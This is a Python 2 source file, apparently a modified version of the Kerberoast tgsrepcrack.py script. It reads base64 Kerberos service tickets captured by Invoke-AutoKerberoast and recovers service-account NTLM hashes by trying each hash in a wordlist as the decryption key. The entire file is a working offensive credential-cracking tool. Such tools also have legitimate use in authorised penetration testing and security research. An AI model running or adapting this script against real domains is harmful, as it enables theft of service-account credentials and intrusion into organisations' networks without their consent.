# Note: This heavily based off tgsrepcrack.py with modifications to take input from the Invoke-Autokerberoast function output and use a wordlist of NTLM hashes instead of passwords


# Based on the Kerberoast script from Tim Medin to extract the Kerberos tickets
# from a kirbi file.
# Modification to parse them into the JTR-format by Michael Kramer (SySS GmbH)
# Copyright [2015] [Tim Medin, Michael Kramer]
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License


from pyasn1.codec.ber import encoder, decoder
from multiprocessing import JoinableQueue, Manager
import kerberos, glob, sys, base64, binascii


# This will separate out the list of all tickets into an array of individual tickets
def parseTickets(allTickets):
	magicString1 = "Base64 encoded Kerberos ticket for "
	magicString2 = ":::do"
	ticketArray = []
	labelArray = []
	failedTicketLabelArray = []

	if ( allTickets[:len(magicString1)] != magicString1 ):
		print "ERROR: Ticket file must start with string \"Base64 encoded Kerberos ticket for\" from Invoke-AutoKerberoast Output."
		exit(1)

	combinedArray = allTickets.split(magicString1)
	combinedArray = combinedArray[1:]

	count = 0
	for i in combinedArray:
		count += 1
		try:
			magicString2Location = i.index(magicString2)
			labelArray.append("ID#"+str(count)+"_"+str(i[:magicString2Location]))
			ticketArray.append(str(i[(magicString2Location+3):]))
		except:
			#print "DEBUG\n" + str(i) + "DEBUG\n\n"
			endOfNameLocation = i.index(":::")
			failedTicketLabelArray.append("ID#"+str(count)+"_"+str(i[:endOfNameLocation]))

	return ticketArray, labelArray, failedTicketLabelArray


# Attempt to crack base64 encoded ticket using NTLM hashes.  Label should be describe where the ticket came from, e.g. "MSSQLSvc/SQLBOX.RESTRICTED.TESTLAB.LOCAL:1433"
def crackTicket(ticket, label, hashList):
	try:
		data = base64.b64decode(ticket)
	except:
		#print "DEBUG\n" + str(ticket) + "DEBUG\n\n"
		return "FAIL" + str(label) + "\n"
	
	manager = Manager()
	enctickets = manager.list()

	if data[0] == '\x76':
		try:
			enctickets.append((str(decoder.decode(data)[0][2][0][3][2])))
		except:
			#print "DEBUG\n" + str(ticket) + "DEBUG\n\n"
			return "FAIL" + str(label)
	elif data[:2] == '6d':
		for ticket in data.strip().split('\n'):
			try:
				enctickets.append((str(decoder.decode(ticket.decode('hex'))[0][4][3][2])))
			except:
				#print "DEBUG\n" + str(ticket) + "DEBUG\n\n"
				return "FAIL" + str(label)

	print "\nAccount: " + label

	for currentHash in hashList:
		ntlmHash_hex = binascii.unhexlify(currentHash)
		kdata, nonce = kerberos.decrypt(ntlmHash_hex, 2, enctickets[0])
		if kdata:
			print "NTLM Hash: " + currentHash
			break

	return ""


def main():
	if len(sys.argv) < 3 or len(sys.argv) > 4:
		print 'USAGE: python ./autoNTLMcrack.py <ticketsFile.txt> <NTLM_wordlist.txt>\n\tNote: Tickets file should be the output of Invoke-AutoKerberoast, starting with \'Base64 encoded Kerberos ticket for...\''
		print 'OPTIONAL USAGE: python ./autoNTLMcrack.py <ticketsFile.txt> <NTLM_wordlist.txt> MASK\n\tNote: placing the word MASK as the forth argument will replace the username/SPN caption with numeric values'
		exit(1)

	hashcatTickets = ""
	failedDecodeTicketLabelArray = []
	ticketsFileName = sys.argv[1]
	HashFileName = sys.argv[2]
	maskNames = False

	if (len(sys.argv) == 4) and (str(sys.argv[3]).upper() == "MASK"):
		maskNames = True

	ticketsFile = open(ticketsFileName, 'r')
	ticketsFileString = ticketsFile.read()
	ticketsFileString = ticketsFileString.replace('[+] received output:','')
	ticketsFileString = ticketsFileString.replace('received output:','')
	ticketsFileString = ticketsFileString.replace('\n','')

	HashFile = open(HashFileName, 'r')
	hashList = HashFile.read().split('\n')

	ticketArray, labelArray, failedRequestTicketLabelArray = parseTickets(ticketsFileString)

	if (maskNames == True):
		for i in range(len(labelArray)):
			maskedLabel = str(labelArray[i])
			maskedLabelCutOffLoc = maskedLabel.index("_")+1
			labelArray[i] = maskedLabel[:maskedLabelCutOffLoc]
		for i in range(len(failedRequestTicketLabelArray)):
			maskedLabel = str(failedRequestTicketLabelArray[i])
			maskedLabelCutOffLoc = maskedLabel.index("_")+1
			failedRequestTicketLabelArray[i] = maskedLabel[:maskedLabelCutOffLoc]

	for i in range(len(ticketArray)):
		parsedTicket = crackTicket(ticketArray[i], labelArray[i], hashList)
		if parsedTicket[0:4] == "FAIL":
			failedDecodeTicketLabelArray.append(str(parsedTicket)[4:])
		else:
			hashcatTickets += parsedTicket

	print hashcatTickets

	if len(failedRequestTicketLabelArray) > 0:
		print "\nWARNING: unable to REQUEST tickets for:"
		print str(failedRequestTicketLabelArray)

	if len(failedDecodeTicketLabelArray) > 0:
		print "\nWARNING: unable to DECODE tickets for:"
		print str(failedDecodeTicketLabelArray)


if __name__ == '__main__':
    main()
